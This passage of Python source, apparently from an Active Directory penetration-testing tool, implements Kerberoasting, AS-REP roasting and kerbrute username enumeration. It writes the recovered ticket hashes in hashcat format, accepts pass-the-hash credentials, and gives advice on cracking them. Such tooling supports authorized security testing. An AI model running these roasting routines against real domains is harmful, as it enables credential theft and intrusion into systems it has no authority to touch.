"""Kerberos enumeration mixin.

This module provides Kerberos-focused enumeration operations including:
- Ticket artifact discovery (ccache, kirbi, keytab)
- Native Kerberoasting helpers (via kerbad)
- Native AS-REP roasting helpers (via kerbad)

Kerberos protocol operations (TGT, TGS, roasting) use kerbad via
``kerberos_transport``.  impacket.krb5 is intentionally absent from this
module.  See AGENTS.md § Migration 4 for rationale.

INTENTIONALLY KEPT ON IMPACKET (hard stops from migration spec):
- ``rodc_golden_ticket.py`` — PAC forging, stays on impacket permanently
- ``kerberos_key_list.py``  — stays on impacket (DECISION PENDING evaluation)
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Optional, List
import subprocess
import shlex
import re

from rich.table import Table

from adscan_internal.core import AuthMode, requires_auth
from adscan_internal.command_runner import CommandSpec, default_runner
from adscan_internal.rich_output import mark_sensitive, print_info_debug
from adscan_internal.services.async_bridge import run_async_sync
from adscan_core.rich_output import (
    print_panel,
    print_table,
    print_info,
    print_info_verbose,
    print_success,
    print_warning,
    print_error,
    is_verbose_mode,
)
from adscan_internal.subprocess_env import (
    command_string_needs_clean_env,
    get_clean_env_for_compilation,
)
from adscan_internal.services.ldap_transport_service import (
    execute_with_ldap_fallback,
    prepare_kerberos_ldap_environment,
    resolve_ldap_target_endpoints,
)
from adscan_internal.integrations.impacket import (
    KerberoastHash,
    ASREPHash,
)
from adscan_internal.services.kerberos_transport import (
    KerberosConfig,
    KerberosTransportError,
    KerberosClockSkewError,
    kerberoast_users,
    asreproast_users,
)
from adscan_internal import telemetry


_UF_ACCOUNTDISABLE = 0x0002
_UF_DONT_REQUIRE_PREAUTH = 0x400000


CommandExecutor = Callable[[str, int], subprocess.CompletedProcess[str]]


def _default_executor(command: str, timeout: int) -> subprocess.CompletedProcess[str]:
    """Execute a command using the shared command runner.

    Args:
        command: Command string to execute.
        timeout: Timeout in seconds.

    Returns:
        Completed process result.
    """
    use_clean_env = command_string_needs_clean_env(command)
    cmd_env = get_clean_env_for_compilation() if use_clean_env else None
    return default_runner.run(
        CommandSpec(
            command=command,
            timeout=timeout,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
            env=cmd_env,
        )
    )


def _format_auth_mode(password: Optional[str], hashes: Optional[str]) -> str:
    """Return a user-facing authentication mode string."""
    if hashes:
        return "NT hash (pass-the-hash)"
    if password:
        return "Password"
    return "No credential"


def _render_roast_summary(
    *,
    title: str,
    rows: list[tuple[str, str, str, str]],
) -> None:
    """Render the per-user result table for a roasting operation.

    Args:
        title: Table title (e.g. "Kerberoast Results").
        rows: Sequence of ``(user_display, status, etype, detail)`` tuples
              already formatted for display.
    """
    if not rows:
        return
    table = Table(title=title, header_style="bold")
    table.add_column("User", overflow="fold")
    table.add_column("Result")
    table.add_column("Encryption", justify="center")
    table.add_column("Detail", overflow="fold")
    for user_display, status, etype, detail in rows:
        table.add_row(user_display, status, _styled_etype(etype), detail)
    print_table(table)


# Hashcat etype index → display label.
_ETYPE_LABEL: dict[str, str] = {
    "17": "AES-128",
    "18": "AES-256",
    "23": "RC4-HMAC",
}

# Hashcat modes differ between TGS-REP (kerberoast) and AS-REP (asreproast).
#   kerberoast:  RC4=13100  AES-128=19600  AES-256=19700
#   asreproast:  RC4=18200  AES-128=19800  AES-256=19900
_HASHCAT_MODES: dict[str, dict[str, str]] = {
    "kerberoast": {"23": "13100", "17": "19600", "18": "19700"},
    "asreproast": {"23": "18200", "17": "19800", "18": "19900"},
}


def _extract_etype(hash_line: Optional[str]) -> str:
    """Best-effort extraction of the etype label from a hashcat roast line."""
    if not hash_line:
        return "—"
    match = re.search(r"\$krb5(?:tgs|asrep)\$(\d+)\$", hash_line)
    if not match:
        return "—"
    return _ETYPE_LABEL.get(match.group(1), f"etype {match.group(1)}")


def _extract_etype_key(hash_line: Optional[str]) -> Optional[str]:
    """Return the raw etype number string from a roast hash line, or None."""
    if not hash_line:
        return None
    match = re.search(r"\$krb5(?:tgs|asrep)\$(\d+)\$", hash_line)
    return match.group(1) if match else None


def _styled_etype(label: str) -> str:
    """Wrap an etype label in Rich markup: RC4=green (fast), AES=yellow (slow)."""
    if label.startswith("RC4"):
        return f"[bold green]{label}[/bold green]"
    if label.startswith("AES"):
        return f"[bold yellow]{label}[/bold yellow]"
    return label


def _render_etype_advisory(
    etype_keys: list[str], roast_type: str = "kerberoast"
) -> None:
    """Print a cracking-difficulty advisory when AES tickets are present.

    RC4 (etype 23) cracks in minutes on consumer GPU.
    AES-128/256 (etypes 17/18) is ~200× slower — relevant for operator planning.
    """
    has_aes = any(k in ("17", "18") for k in etype_keys)
    has_rc4 = "23" in etype_keys
    if not has_aes:
        return

    modes = _HASHCAT_MODES.get(roast_type, _HASHCAT_MODES["kerberoast"])
    lines: list[str] = []

    if has_rc4 and has_aes:
        lines.append(
            "[bold yellow]Mixed encryption[/bold yellow]:"
            " RC4 and AES tickets recovered."
        )
        lines.append(
            f"  [green]RC4-HMAC[/green]  → hashcat mode [bold]{modes['23']}[/bold]"
            "  — cracks in minutes on consumer GPU"
        )
        lines.append(
            f"  [yellow]AES-128[/yellow]   → hashcat mode [bold]{modes['17']}[/bold]"
            "  — ~200× slower than RC4"
        )
        lines.append(
            f"  [yellow]AES-256[/yellow]   → hashcat mode [bold]{modes['18']}[/bold]"
            "  — ~200× slower than RC4"
        )
        lines.append(
            "\n[dim]Crack RC4 hashes first."
            " AES requires a targeted wordlist or GPU cluster.[/dim]"
        )
    else:
        lines.append("[bold yellow]All tickets use AES encryption.[/bold yellow]")
        lines.append(
            f"  [yellow]AES-128[/yellow]  → hashcat mode [bold]{modes['17']}[/bold]"
        )
        lines.append(
            f"  [yellow]AES-256[/yellow]  → hashcat mode [bold]{modes['18']}[/bold]"
        )
        lines.append(
            "\n[dim]AES cracking is ~200× slower than RC4. Use a focused wordlist "
            "(e.g. rockyou + rules) or a dedicated GPU rig. "
            "Weak or default passwords still crack quickly.[/dim]"
        )

    print_panel(
        "\n".join(lines),
        title="[bold yellow]⚠  Cracking Difficulty[/bold yellow]",
        border_style="yellow",
    )


@dataclass(frozen=True)
class KerberosTicketArtifact:
    """Kerberos ticket artefact discovered in a workspace.

    Attributes:
        principal: Optional principal inferred from filename or metadata.
        path: Absolute path to the artefact.
        kind: Artefact kind (ccache/kirbi/keytab/unknown).
    """

    principal: Optional[str]
    path: Path
    kind: str


class KerberosEnumerationMixin:
    """Kerberos enumeration operations.

    This mixin is composed by :class:`adscan_internal.services.enumeration.EnumerationService`.
    """

    def __init__(self, parent_service):
        """Initialize Kerberos enumeration mixin.

        Args:
            parent_service: Parent EnumerationService instance.
        """
        self.parent = parent_service
        self.logger = parent_service.logger

    @requires_auth(AuthMode.AUTHENTICATED)
    def discover_ticket_artifacts(
        self,
        workspace_dir: str,
        domain: str,
        *,
        scan_id: Optional[str] = None,
    ) -> list[KerberosTicketArtifact]:
        """Discover Kerberos ticket artefacts within the workspace.

        This searches common locations like:
        - ``<workspace>/domains/<domain>/kerberos/tickets`` (new layout)
        - ``<workspace>/domains/<domain>/kerberos`` (legacy layout)

        Args:
            workspace_dir: Workspace root directory.
            domain: Target domain name.
            scan_id: Optional scan id for progress emission.

        Returns:
            List of ticket artefacts discovered.
        """
        root = Path(workspace_dir).expanduser().resolve()
        tickets_root = root / "domains" / domain / "kerberos"
        candidates = [
            tickets_root / "tickets",
            tickets_root,
        ]

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_artifacts",
            progress=0.0,
            message=f"Searching Kerberos artefacts for {domain}",
        )

        artifacts: list[KerberosTicketArtifact] = []
        for directory in candidates:
            if not directory.exists() or not directory.is_dir():
                continue
            artifacts.extend(self._scan_ticket_dir(directory))

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_artifacts",
            progress=1.0,
            message=f"Kerberos artefact discovery completed: {len(artifacts)} found",
        )
        return artifacts

    def _scan_ticket_dir(self, directory: Path) -> list[KerberosTicketArtifact]:
        """Scan a directory for ticket artefacts.

        Args:
            directory: Directory to scan.

        Returns:
            List of artifacts.
        """
        artifacts: list[KerberosTicketArtifact] = []
        for path in directory.rglob("*"):
            if not path.is_file():
                continue

            kind = self._infer_ticket_kind(path)
            if kind == "unknown":
                continue

            principal = self._infer_principal(path)
            artifacts.append(
                KerberosTicketArtifact(
                    principal=principal,
                    path=path.resolve(),
                    kind=kind,
                )
            )
        return artifacts

    @staticmethod
    def _infer_ticket_kind(path: Path) -> str:
        """Infer artefact kind from filename suffix."""
        suffix = path.suffix.lower()
        if suffix in (".ccache", ".cache"):
            return "ccache"
        if suffix == ".kirbi":
            return "kirbi"
        if suffix == ".keytab":
            return "keytab"
        return "unknown"

    @staticmethod
    def _infer_principal(path: Path) -> Optional[str]:
        """Best-effort principal inference from filename.

        We intentionally keep this heuristic minimal to avoid false positives.
        """
        name = path.name
        if "@" in name:
            # Example: administrator@domain.ccache
            return name.split("@", 1)[0]
        return None

    @requires_auth(AuthMode.UNAUTHENTICATED)
    def enumerate_users_kerberos(
        self,
        domain: str,
        pdc: str,
        *,
        wordlist: str,
        kerbrute_path: str,
        output_file: Path,
        executor: CommandExecutor | None = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,
    ) -> List[str]:
        """Enumerate users via Kerberos without LDAP access.

        This method wraps ``kerbrute userenum`` to perform username
        enumeration using Kerberos pre-authentication.

        The CLI is responsible for interactive wordlist selection and
        workspace layout; this helper focuses on command construction,
        execution, and parsing the resulting user list.

        Args:
            domain: Target Active Directory domain.
            pdc: Primary Domain Controller IP/hostname.
            wordlist: Path to the username wordlist.
            kerbrute_path: Full path to the ``kerbrute`` binary.
            output_file: Path where kerbrute should write its log/output.
            executor: Optional command executor, mainly for testing.
            scan_id: Optional scan identifier for progress emission.
            timeout: Command timeout in seconds.

        Returns:
            List of unique usernames (lowercase) discovered.
        """

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_user_enumeration",
            progress=0.0,
            message=f"Enumerating users via Kerberos on {domain}",
        )

        # Build kerbrute command.
        cmd = (
            f"{shlex.quote(kerbrute_path)} userenum "
            f"-d {shlex.quote(domain)} "
            f"--dc {shlex.quote(pdc)} "
            f"{shlex.quote(wordlist)} "
            f"-o {shlex.quote(str(output_file))}"
        )

        exec_fn = executor or _default_executor

        self.logger.info(
            "Executing Kerberos user enumeration",
            extra={"domain": domain, "pdc": pdc},
        )

        try:
            result = exec_fn(cmd, timeout)
        except subprocess.TimeoutExpired:
            self.logger.error(
                "Kerberos user enumeration timed out",
                extra={"domain": domain, "pdc": pdc},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration timed out",
            )
            return []
        except Exception as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            self.logger.exception(
                "Unexpected error during Kerberos user enumeration",
                extra={"domain": domain, "pdc": pdc},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration failed",
            )
            return []

        if result.returncode != 0:
            self.logger.warning(
                "Kerberos user enumeration command failed",
                extra={
                    "domain": domain,
                    "pdc": pdc,
                    "returncode": result.returncode,
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                },
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration failed",
            )
            return []

        # Parse kerbrute output file for discovered usernames.
        if not output_file.exists():
            self.logger.warning(
                "Kerberos user enumeration output file not found",
                extra={"domain": domain, "output_file": str(output_file)},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration completed with no results",
            )
            return []

        usernames: list[str] = []
        seen: set[str] = set()

        try:
            for raw_line in output_file.read_text(
                encoding="utf-8", errors="ignore"
            ).splitlines():
                line = raw_line.strip()
                if not line or "@" not in line:
                    continue

                # Kerbrute commonly prints lines like:
                #   [*] VALID USERNAME: user@domain.local
                # We perform a best-effort extraction of the `user` part.
                match = re.search(
                    rf"\b([A-Za-z0-9._$-]+)@{re.escape(domain)}\b", line, re.IGNORECASE
                )
                if not match:
                    # Fallback: look for any token containing '@'.
                    token_user: Optional[str] = None
                    for token in line.split():
                        if "@" in token:
                            token_user = token.split("@", 1)[0]
                            break
                    if not token_user:
                        continue
                    candidate = token_user
                else:
                    candidate = match.group(1)

                user = (candidate or "").strip().lower()
                if not user or user == "ronnie":
                    # Preserve original behaviour that skipped the lab author user.
                    continue
                if user in seen:
                    continue
                seen.add(user)
                usernames.append(user)
        except OSError as exc:
            telemetry.capture_exception(exc)
            self.logger.exception(
                "Failed to read Kerberos enumeration output file",
                extra={"domain": domain, "output_file": str(output_file)},
            )
            return []

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_user_enumeration",
            progress=1.0,
            message=f"Kerberos user enumeration completed: {len(usernames)} user(s) found",
        )
        self.logger.info(
            "Kerberos user enumeration completed",
            extra={"domain": domain, "count": len(usernames)},
        )
        return usernames

    @requires_auth(AuthMode.AUTHENTICATED)
    def kerberoast(
        self,
        domain: str,
        pdc: str,
        username: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        *,
        auth_domain: Optional[str] = None,
        usersfile: Optional[Path] = None,
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,  # noqa: ARG002 — kept for back-compat; native path manages its own timeouts.
    ) -> List[KerberoastHash]:
        """Perform Kerberoasting natively via kerbad (no impacket scripts).

        Workflow (single code path, same-domain and cross-realm):
            1. Enumerate SPN-bearing users over LDAP (LDAPS preferred, Kerberos auth).
            2. Build a ``KerberosConfig`` from the supplied credential.
            3. Use ``kerberos_transport.kerberoast_users`` to obtain TGS material
               in hashcat ``$krb5tgs$`` format.

        Args:
            domain: Target domain (where SPNs live).
            pdc: Primary Domain Controller for ``domain``.
            username: sAMAccountName of the authenticating user.
            password: Plaintext password (mutually optional with ``hashes``).
            hashes: NTLM hashes (LM:NT or NT) for pass-the-hash auth.
            auth_domain: Domain the credential belongs to.  Defaults to ``domain``.
            usersfile: Optional list narrowing the SPN target set.
            workspace_dir: Workspace root directory for environment preparation.
            domains_data: Per-domain configuration mapping.
            sync_clock: Optional hook to sync clock with the PDC.
            output_file: Optional file where hashcat lines are written.
            scan_id: Optional scan identifier for progress emission.
            timeout: Legacy parameter, ignored.

        Returns:
            List of :class:`KerberoastHash` entries (hashcat ``$krb5tgs$`` lines).

        Raises:
            ValueError: If neither password nor hashes provided.
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting",
            progress=0.0,
            message=f"Starting Kerberoasting attack on {domain}",
        )

        if not password and not hashes:
            raise ValueError(
                "Either password or hashes must be provided for Kerberoasting"
            )

        normalized_auth_domain = str(auth_domain or domain).strip() or domain
        cross_realm = normalized_auth_domain.lower() != domain.lower()

        marked_domain = mark_sensitive(domain, "domain")
        marked_user = mark_sensitive(username, "user")
        marked_pdc = mark_sensitive(str(pdc), "ip")

        cross_realm_note = " · cross-realm" if cross_realm else ""
        print_info_verbose(
            f"Kerberoast · KDC {marked_pdc} · "
            f"{marked_user}@{mark_sensitive(normalized_auth_domain, 'domain')} · "
            f"{_format_auth_mode(password, hashes)}{cross_realm_note}"
        )

        self.logger.info(
            "Executing Kerberoasting attack",
            extra={
                "domain": domain,
                "pdc": pdc,
                "username": username,
                "has_password": bool(password),
                "has_hashes": bool(hashes),
                "cross_realm": cross_realm,
                "engine": "kerbad_native",
            },
        )

        hashes_list = self._kerberoast_via_ldap(
            domain=domain,
            pdc=pdc,
            username=username,
            password=password,
            hashes=hashes,
            auth_domain=normalized_auth_domain,
            output_file=output_file,
            workspace_dir=workspace_dir,
            domains_data=domains_data,
            sync_clock=sync_clock,
        )

        self.logger.info(
            "Kerberoasting completed: %s hash(es) extracted",
            len(hashes_list),
            extra={
                "domain": domain,
                "auth_domain": normalized_auth_domain,
                "count": len(hashes_list),
                "engine": "kerbad_native",
            },
        )

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting",
            progress=1.0,
            message=f"Kerberoasting completed: {len(hashes_list)} hash(es) found",
        )

        if hashes_list:
            print_success(
                f"Recovered {len(hashes_list)} service ticket hash(es) for {marked_domain}."
            )
        else:
            print_warning(f"No Kerberoast hashes recovered for {marked_domain}.")

        return hashes_list

    def _kerberoast_via_ldap(
        self,
        *,
        domain: str,
        pdc: str,
        username: str,
        password: Optional[str],
        hashes: Optional[str],
        auth_domain: str,
        output_file: Optional[Path],
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
    ) -> List[KerberoastHash]:
        """Enumerate roastable users via LDAP and request TGS tickets via kerbad.

        Phase 1 (LDAP enumeration) uses ADscanLDAPConnection.
        Phase 2 (TGT + TGS-REQ per SPN) calls
        ``kerberos_transport.kerberoast_users``.

        Same-domain and cross-realm flows share this code path; the
        ``cross_domain`` flag inside kerbad is selected automatically based
        on ``auth_domain`` vs ``domain``.

        AES-only environments are handled by the kerbad transport's
        ETYPE-INFO2 salt probe; ``etypes=[18, 17, 23]`` is offered when only
        a password is available so AES is preferred when supported.
        """
        domains_data_obj: object = domains_data or {}
        workspace_root = str(workspace_dir or "").strip()
        sync_clock_fn = sync_clock

        kerberos_ready = self._prepare_roasting_kerberos_environment(
            operation_name="kerberoast",
            target_domain=domain,
            workspace_dir=workspace_root,
            username=username,
            user_domain=auth_domain,
            credential=password or hashes,
            dc_ip=pdc,
            domains_data=domains_data_obj,
            sync_clock=sync_clock_fn,
        )
        if not kerberos_ready:
            return []

        domains_data = domains_data_obj if isinstance(domains_data_obj, dict) else {}
        domain_data = (
            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
        )
        endpoints = resolve_ldap_target_endpoints(
            target_domain=domain,
            domain_data={**domain_data, "pdc": pdc or domain_data.get("pdc")},
            kerberos_ready=True,
        )
        dc_address = str(pdc or endpoints.dc_address or "").strip()
        if not dc_address:
            return []

        print_info("Enumerating SPN-bearing users via LDAP...")

        search_filter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
        attributes = [
            "sAMAccountName",
            "userAccountControl",
            "memberOf",
            "pwdLastSet",
            "lastLogon",
            "objectClass",
        ]

        def _collect(connection: Any) -> list[dict[str, object]]:
            search_base = ",".join(
                f"DC={label}" for label in str(domain).split(".") if label.strip()
            )
            connection.search(
                search_base=search_base,
                search_filter=search_filter,
                attributes=attributes,
                search_scope="SUBTREE",
                paged_size=1000,
            )
            if not isinstance(connection.entries, list):
                return []

            collected: list[dict[str, object]] = []
            for entry in connection.entries:
                raw_mapping = entry.entry_attributes_as_dict
                mapping = raw_mapping if isinstance(raw_mapping, dict) else {}
                user_account_control = int(
                    self._first_attribute_value(mapping, "userAccountControl") or 0
                )
                if user_account_control & _UF_ACCOUNTDISABLE:
                    continue
                sam = str(
                    self._first_attribute_value(mapping, "sAMAccountName") or ""
                ).strip()
                if not sam:
                    continue
                collected.append(
                    {
                        "sAMAccountName": sam,
                        "objectClass": [
                            str(value).strip().lower()
                            for value in self._attribute_values(mapping, "objectClass")
                            if str(value).strip()
                        ],
                    }
                )
            return collected

        auth_domain_data = (
            domains_data.get(auth_domain, {}) if isinstance(domains_data, dict) else {}
        )
        auth_kdc = str(auth_domain_data.get("pdc") or "").strip() or None
        try:
            entries, _used_ldaps = execute_with_ldap_fallback(
                operation_name="kerberoast",
                target_domain=domain,
                dc_address=dc_address,
                callback=_collect,
                username=username,
                password=password,
                use_kerberos=True,
                prefer_ldaps=True,
                kerberos_target_hostname=endpoints.kerberos_target_hostname,
                allow_password_fallback_on_kerberos_failure=False,
                auth_domain=auth_domain,
                auth_kdc=auth_kdc,
            )
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"LDAP enumeration failed while preparing Kerberoast on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []
        if not entries:
            print_warning("No SPN-bearing users found in directory.")
            return []

        target_usernames: list[str] = []
        for entry in entries:
            sam = str(entry.get("sAMAccountName") or "").strip()
            if sam:
                target_usernames.append(sam)

        if not target_usernames:
            print_warning("No usable SPN-bearing usernames after filtering.")
            return []

        print_info_verbose(
            f"Requesting service tickets for {len(target_usernames)} user(s)..."
        )

        # Build KerberosConfig.  Priority: NT hash > password.
        nt_hash: Optional[str] = None
        if hashes:
            hash_text = str(hashes).strip()
            if ":" in hash_text:
                _, nt_hash = hash_text.split(":", 1)
            else:
                nt_hash = hash_text

        krb_config = KerberosConfig(
            domain=auth_domain,
            kdc_ip=pdc,  # target domain KDC (for TGS-REQ referral target)
            username=username,
            password=password if not nt_hash else None,
            nt_hash=nt_hash or None,
            etypes=[18, 17, 23] if (not nt_hash) else None,
            auth_kdc_ip=auth_kdc,
        )

        try:
            roast_results = run_async_sync(
                kerberoast_users(
                    krb_config,
                    target_usernames,
                    target_domain=domain,
                )
            )
        except KerberosClockSkewError as exc:
            telemetry.capture_exception(exc)
            print_error(
                "Clock skew too large between this host and the KDC. "
                "Synchronise the clock and retry."
            )
            return []
        except KerberosTransportError as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Kerberos transport error during Kerberoasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Unexpected error during Kerberoasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []

        lines_to_write: list[str] = []
        hashes_list: list[KerberoastHash] = []
        table_rows: list[tuple[str, str, str, str]] = []
        revoked_count = 0
        other_skip_count = 0
        no_hash_count = 0
        for sam, hash_line, err in roast_results:
            user_display = mark_sensitive(sam, "user")
            if err is not None and not hash_line:
                err_text = str(err)
                low = err_text.lower()
                if "revoked" in low or "kdc_err_client_revoked" in low:
                    revoked_count += 1
                    table_rows.append(
                        (
                            user_display,
                            "[dim]disabled[/dim]",
                            "—",
                            "account disabled or locked",
                        )
                    )
                else:
                    other_skip_count += 1
                    print_info_verbose(f"[skip] {user_display}: {err_text}")
                    table_rows.append(
                        (user_display, "[yellow]skipped[/yellow]", "—", err_text[:80])
                    )
                continue
            if not hash_line:
                no_hash_count += 1
                table_rows.append(
                    (
                        user_display,
                        "[yellow]no hash[/yellow]",
                        "—",
                        "no TGS material returned",
                    )
                )
                continue
            hashes_list.append(KerberoastHash(username=sam, hash_value=hash_line))
            lines_to_write.append(hash_line)
            etype_label = _extract_etype(hash_line)
            styled = _styled_etype(etype_label)
            print_success(f"  └─ {user_display}  ({styled})  →  hashcat-ready")
            table_rows.append(
                (
                    user_display,
                    "[green]hash[/green]",
                    etype_label,
                    "service ticket retrieved",
                )
            )

        if output_file is not None:
            output_file.parent.mkdir(parents=True, exist_ok=True)
            output_file.write_text(
                "".join(f"{line}\n" for line in lines_to_write),
                encoding="utf-8",
            )

        skipped_total = revoked_count + other_skip_count + no_hash_count
        if skipped_total and not is_verbose_mode():
            parts: list[str] = []
            if revoked_count:
                parts.append(f"{revoked_count} disabled/revoked")
            if no_hash_count:
                parts.append(f"{no_hash_count} no TGS")
            if other_skip_count:
                parts.append(f"{other_skip_count} other")
            print_info(
                f"  [dim]{skipped_total} users skipped: "
                f"{' · '.join(parts)}  (run with --verbose for full table)[/dim]"
            )
        elif is_verbose_mode():
            _render_roast_summary(title="Kerberoast Results", rows=table_rows)
        _render_etype_advisory(
            [k for h in lines_to_write if (k := _extract_etype_key(h))],
            roast_type="kerberoast",
        )

        print_info_debug(
            "[kerberoast] Native kerbad path: "
            f"target_domain={mark_sensitive(domain, 'domain')} "
            f"auth_domain={mark_sensitive(auth_domain, 'domain')} "
            f"entries={len(entries)} hashes={len(hashes_list)}"
        )
        return hashes_list

    # Backwards-compatible alias for the previous private name.
    _kerberoast_cross_domain_via_ldap = _kerberoast_via_ldap

    @staticmethod
    def _attribute_values(
        mapping: dict[object, object], attribute: str
    ) -> list[object]:
        """Return one attribute as a stable list from an ldap3 mapping."""
        for key, value in mapping.items():
            if str(key).casefold() != str(attribute).casefold():
                continue
            if isinstance(value, (list, tuple, set)):
                return list(value)
            return [value]
        return []

    @classmethod
    def _first_attribute_value(
        cls, mapping: dict[object, object], attribute: str
    ) -> object | None:
        """Return the first value for one attribute from an ldap3 mapping."""
        values = cls._attribute_values(mapping, attribute)
        return values[0] if values else None

    def asreproast(
        self,
        domain: str,
        pdc: str,
        *,
        username: Optional[str] = None,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        auth_domain: Optional[str] = None,
        usersfile: Optional[Path] = None,
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,  # noqa: ARG002 — kept for back-compat; native path manages its own timeouts.
    ) -> List[ASREPHash]:
        """Perform AS-REP Roasting natively via kerbad (no impacket scripts).

        Two modes:
            * Authenticated — LDAP-enumerated users with ``DONT_REQUIRE_PREAUTH``.
            * Unauthenticated — usernames from a wordlist file.

        Args:
            domain: Target domain.
            pdc: Primary Domain Controller for ``domain``.
            username: sAMAccountName for authenticated mode (optional).
            password: Plaintext password for authenticated mode (optional).
            hashes: NTLM hashes for authenticated mode (optional).
            auth_domain: Domain the credential belongs to.  Defaults to ``domain``.
            usersfile: User wordlist (required for unauthenticated mode).
            workspace_dir: Workspace root directory for environment preparation.
            domains_data: Per-domain configuration mapping.
            sync_clock: Optional hook to sync clock with the PDC.
            output_file: Optional file where hashcat lines are written.
            scan_id: Optional scan identifier for progress emission.
            timeout: Legacy parameter, ignored.

        Returns:
            List of :class:`ASREPHash` entries (hashcat ``$krb5asrep$`` lines).

        Raises:
            ValueError: If neither credentials nor usersfile provided.
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="asreproasting",
            progress=0.0,
            message=f"Starting AS-REP Roasting attack on {domain}",
        )

        is_authenticated = bool(username and password)
        is_unauthenticated = bool(usersfile)

        if not is_authenticated and not is_unauthenticated:
            raise ValueError(
                "Either credentials (username + password) or usersfile must be provided for AS-REP Roasting"
            )

        normalized_auth_domain = str(auth_domain or domain).strip() or domain
        marked_domain = mark_sensitive(domain, "domain")
        marked_pdc = mark_sensitive(str(pdc), "ip")
        mode_label = (
            "authenticated · LDAP candidates"
            if is_authenticated
            else "unauthenticated · wordlist"
        )
        print_info_verbose(
            f"AS-REP Roast · KDC {marked_pdc} · {mode_label}"
        )

        self.logger.info(
            "Executing AS-REP Roasting attack",
            extra={
                "domain": domain,
                "pdc": pdc,
                "mode": "authenticated" if is_authenticated else "unauthenticated",
                "has_usersfile": is_unauthenticated,
                "engine": "kerbad_native",
            },
        )

        if is_authenticated:
            print_info_verbose("Sending AS-REQ without preauth for each candidate...")
            hashes_list = self._asreproast_authenticated_via_ldap(
                domain=domain,
                pdc=pdc,
                username=str(username or ""),
                password=password,
                hashes=hashes,
                auth_domain=normalized_auth_domain,
                output_file=output_file,
                workspace_dir=workspace_dir,
                domains_data=domains_data,
                sync_clock=sync_clock,
            )
        else:
            print_info_verbose("Sending AS-REQ without preauth from wordlist...")
            hashes_list = self._asreproast_from_usersfile(
                domain=domain,
                pdc=pdc,
                usersfile=usersfile,
                output_file=output_file,
            )

        self.logger.info(
            f"AS-REP Roasting completed: {len(hashes_list)} hash(es) extracted",
            extra={"domain": domain, "count": len(hashes_list)},
        )

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="asreproasting",
            progress=1.0,
            message=f"AS-REP Roasting completed: {len(hashes_list)} hash(es) found",
        )

        if hashes_list:
            print_success(
                f"Recovered {len(hashes_list)} AS-REP hash(es) for {marked_domain}."
            )
        else:
            print_warning(f"No AS-REP hashes recovered for {marked_domain}.")

        return hashes_list

    @requires_auth(AuthMode.UNAUTHENTICATED)
    def kerberoast_no_preauth(
        self,
        domain: str,
        pdc: str,
        *,
        no_preauth_username: str,
        usersfile: Path,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
    ) -> List[KerberoastHash]:
        """Request TGS material using a no-preauth account as the primitive.

        Uses kerbad to obtain a TGT (with nopreauth credential type) then
        requests TGS tickets for each target username.
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting_no_preauth",
            progress=0.0,
            message=f"Starting no-preauth Kerberoast attack on {domain}",
        )

        target_lines = self._read_target_lines(usersfile)
        hashes_list: list[KerberoastHash] = []
        lines_to_write: list[str] = []

        filtered = [
            t for t in target_lines if t.lower() != "krbtgt" and not t.endswith("$")
        ]

        if filtered:
            try:
                krb_config = KerberosConfig(
                    domain=domain,
                    kdc_ip=pdc,
                    username=no_preauth_username,
                    password="",  # empty password triggers nopreauth in some kerbad builds
                )
                roast_results = run_async_sync(kerberoast_users(krb_config, filtered))
                for sam, hash_line, err in roast_results:
                    if err is not None or not hash_line:
                        continue
                    hashes_list.append(
                        KerberoastHash(username=sam, hash_value=hash_line)
                    )
                    lines_to_write.append(hash_line)
            except KerberosTransportError as exc:
                telemetry.capture_exception(exc)
                self.logger.error(
                    "kerbad no-preauth kerberoast failed",
                    extra={"domain": domain},
                )
            except Exception as exc:
                telemetry.capture_exception(exc)
                self.logger.exception(
                    "Unexpected error in no-preauth kerberoast",
                    extra={"domain": domain},
                )

        self._write_hash_lines(output_file, lines_to_write)
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting_no_preauth",
            progress=1.0,
            message=f"No-preauth Kerberoast completed: {len(hashes_list)} hash(es) found",
        )
        return hashes_list

    def _prepare_roasting_kerberos_environment(
        self,
        *,
        operation_name: str,
        target_domain: str,
        workspace_dir: str,
        username: str,
        user_domain: str,
